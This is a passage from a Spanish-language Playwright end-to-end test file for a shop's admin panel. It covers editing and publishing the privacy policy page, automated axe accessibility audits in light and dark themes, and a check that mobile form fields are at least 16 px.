      return { token: accessToken, detalle };
    });

    await page.getByRole('link', { name: 'Páginas', exact: true }).click();

    // Se espera a la fila antes de pulsarla: mientras carga, la tabla es un
    // esqueleto y el clic se iría al vacío.
    const fila = page.getByRole('button', { name: 'Política de privacidad' });
    await expect(fila).toBeVisible({ timeout: 20_000 });
    await fila.click();

    const marca = `Responsable del tratamiento: Prueba e2e, NIF B00000000. Redactado desde el panel.`;
    await page.getByLabel(/^Contenido/).fill(marca);
    await page.getByLabel('Estado', { exact: true }).selectOption('PUBLISHED');

    const guardado = page.waitForResponse(
      (r) => r.url().includes('/content/admin/pages') && r.request().method() === 'POST',
      { timeout: 20_000 },
    );
    await page.getByRole('button', { name: 'Guardar', exact: true }).click();
    expect((await guardado).status()).toBeLessThan(300);

    // Y en la tienda: por la vía pública y sin sesión, que es como la pide un
    // visitante —y como la pediría una inspección—.
    const publico = await page.evaluate(async () => {
      const r = await fetch('/api/v1/content/pages/es/privacidad');
      return { estado: r.status, cuerpo: (await r.json()) as { title: string; content: string } };
    });

    expect(publico.estado).toBe(200);
    expect(publico.cuerpo.content).toContain('Prueba e2e');

    // Se deja como estaba, incluido el estado de publicación.
    await page.evaluate(
      async (previo: {
        token: string;
        detalle: {
          id: string;
          handle: string;
          status: string;
          translations: { locale: string; title: string; slug: string; content: string }[];
        };
      }) => {
        await fetch('/api/v1/content/admin/pages', {
          method: 'POST',
          headers: {
            Authorization: `Bearer ${previo.token}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            id: previo.detalle.id,
            handle: previo.detalle.handle,
            status: previo.detalle.status,
            translations: previo.detalle.translations.map((t) => ({
              locale: t.locale,
              title: t.title,
              slug: t.slug,
              content: t.content,
            })),
          }),
        });
      },
      antes,
    );
  });
});

/**
 * Accesibilidad del panel.
 *
 * La tienda se auditaba con axe desde hacía tiempo; el panel, no. Y es la parte
 * que se usa ocho horas al día: quien gestiona pedidos pasa aquí mucho más
 * tiempo que cualquier cliente en la tienda, y la misma EN 301 549 aplica a la
 * herramienta de trabajo si la usa alguien contratado.
 *
 * Se auditan las pantallas que se abren a diario, en claro y en oscuro, porque
 * el tema oscuro tiene su propia paleta y un contraste que cumple en uno puede
 * fallar en el otro.
 */
const PANTALLAS = [
  { nombre: 'panel de inicio', enlace: null },
  { nombre: 'pedidos', enlace: 'Pedidos' },
  { nombre: 'productos', enlace: 'Productos' },
  { nombre: 'clientes', enlace: 'Clientes' },
];

test.describe('Accesibilidad del panel', () => {
  // Una entrada por tema y todas las pantallas dentro, en vez de una prueba por
  // pantalla y tema. No es por rapidez: con ocho accesos seguidos el limitador
  // de intentos de la API responde «Too Many Requests» y las últimas pruebas
  // fallan por no haber podido entrar, que no es lo que se quería medir. Que el
  // limitador salte está bien —es su trabajo— y la suite no debe pelearse con
  // él.
  for (const tema of ['light', 'dark'] as const) {
    test(`el panel cumple WCAG AA en tema ${tema === 'light' ? 'claro' : 'oscuro'}`, async ({
      page,
    }) => {
      // Antes de entrar: cambiarlo después haría que axe midiera los colores
      // de la primera pintura, que son los del tema anterior.
      await page.emulateMedia({ colorScheme: tema });
      await entrar(page);

      const infracciones: string[] = [];

      for (const { nombre, enlace } of PANTALLAS) {
        if (enlace) {
          await page.getByRole('link', { name: enlace, exact: true }).click();
          await expect(page.getByRole('heading', { level: 1 })).toBeVisible({ timeout: 20_000 });
        }

        // Se espera a que la lista termine: auditar el esqueleto de carga mide
        // una pantalla que nadie llega a usar.
        await page.waitForLoadState('networkidle');

        const resultado = await new AxeBuilder({ page })
          .withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa'])
          .analyze();

        for (const v of resultado.violations) {
          for (const n of v.nodes) {
            // El detalle de axe trae los colores y el ratio medido: sin él,
            // «contraste insuficiente» obliga a reproducirlo a mano para saber
            // qué dos colores hay que tocar.
            infracciones.push(
              `[${nombre}] ${v.id} (${v.impact ?? 'sin impacto'}) en «${n.target.join(' ')}»\n` +
                `    ${n.failureSummary?.replace(/\n/g, '\n    ') ?? v.help}`,
            );
          }
        }
      }

      expect(infracciones, infracciones.join('\n')).toEqual([]);
    });
  }
});

/**
 * Los campos del panel, a 16 px en el móvil.
 *
 * Safari en iOS amplía la página al enfocar un campo cuya letra mida menos de
 * 16 px: se toca un cuadro de texto, la pantalla pega un salto y se queda
 * ampliada. El panel está pensado para el escritorio, pero se abre desde el
 * móvil para mirar un pedido, y ahí molestaba en cada campo.
 *
 * Se mide el tamaño CALCULADO y no las clases del código, porque es el número
 * que mira Safari: una utilidad de Tailwind puesta encima de `.campo` gana sin
 * que se vea en ninguna parte, que es exactamente lo que pasaba en trece
 * campos repartidos por nueve pantallas.
 */
test.describe('el móvil no amplía al escribir', () => {
  const PANTALLAS = [
    '/pedidos',
    '/productos',
    '/importar',
    '/proveedores',
    '/marcas',
    '/integraciones',
  ];

  test('ningún campo baja de 16 px', async ({ page }) => {
    await entrar(page);

    // El panel entra por el escritorio; aquí se mira qué pasa desde un teléfono.
    await page.setViewportSize({ width: 390, height: 844 });

    const pequeños: string[] = [];

    for (const ruta of PANTALLAS) {
      await page.goto(ruta);
      await page.waitForLoadState('networkidle');

      const campos = await page.evaluate(() => {
        // Los que no abren teclado no disparan el zoom.
        const sinTeclado = [
          'checkbox',
          'radio',
          'hidden',
          'range',
          'color',
          'file',
          'submit',
          'button',
        ];

        // `Array.from` y no un `spread`: el tsconfig de las pruebas no
        // recorre un `NodeList` con el operador de propagación.
        return Array.from(document.querySelectorAll('input, select, textarea'))
          .filter((e) => !sinTeclado.includes(e.getAttribute('type') ?? 'text'))
          .filter((e) => (e as HTMLElement).offsetParent !== null)
          .map((e) => ({
            que: `${e.tagName.toLowerCase()}.${(e.className || '').toString().split(' ').slice(0, 3).join('.')}`,
            px: Number.parseFloat(getComputedStyle(e).fontSize),
          }));
      });

      for (const campo of campos.filter((c) => c.px < 16)) {
        pequeños.push(`${ruta} → ${campo.que} a ${String(campo.px)}px`);
      }
    }

    expect(
      pequeños,
      `Estos campos harán que iOS amplíe la página al tocarlos:\n${pequeños.join('\n')}`,
    ).toEqual([]);
  });
});
